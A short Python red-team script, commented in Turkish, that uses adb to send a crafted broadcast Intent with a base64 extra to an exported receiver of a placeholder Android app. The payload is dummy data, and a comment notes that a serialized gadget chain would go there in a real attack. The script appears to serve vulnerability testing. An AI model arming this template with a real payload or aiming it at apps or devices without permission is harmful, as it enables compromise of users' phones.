# --- RED TEAM SCRIPT ---
# Bu betik, zafiyetin test edilmesi amacıyla dışa açık bir bileşene 
# manipüle edilmiş bir Intent gönderilmesini simüle eder.
# Sadece test vektörünü gösterir, gerçek ve zararlı bir payload içermez.

import subprocess

# Hedef uygulamanın paket adı ve dışa açık zafiyetli bileşeni
TARGET_PKG = "com.example.vulnerableapp"
TARGET_COMPONENT = ".VulnerableReceiver"
DEVICE_IP = "XX:XX:XX:XX" # Hedef cihaz IP'si maskelenmiştir

def send_malicious_intent():
    print(f"[*] Hedef cihaza ({DEVICE_IP}) özel hazırlanmış Intent gönderiliyor...")
    
    # Zararlı payload'u temsil eden base64 formatında zararsız veri.
    # (Saldırı senaryosunda burada serileştirilmiş bir gadget zinciri bulunur)
    dummy_payload = "QUFBQUFBQUFBQUFBQUFBQQ==" 
    
    adb_cmd = [
        "adb", "-s", DEVICE_IP, "shell", "am", "broadcast",
        "-n", f"{TARGET_PKG}/{TARGET_COMPONENT}",
        "--es", "payload_extra", dummy_payload
    ]
    
    try:
        result = subprocess.run(adb_cmd, capture_output=True, text=True)
        if "Broadcast completed" in result.stdout:
            print("[+] Intent başarıyla iletildi. Payload işleniyor.")
        else:
            print("[-] Intent gönderilemedi veya reddedildi.")
    except Exception as e:
        print(f"[!] Hata: {e}")

if __name__ == "__main__":
    send_malicious_intent()
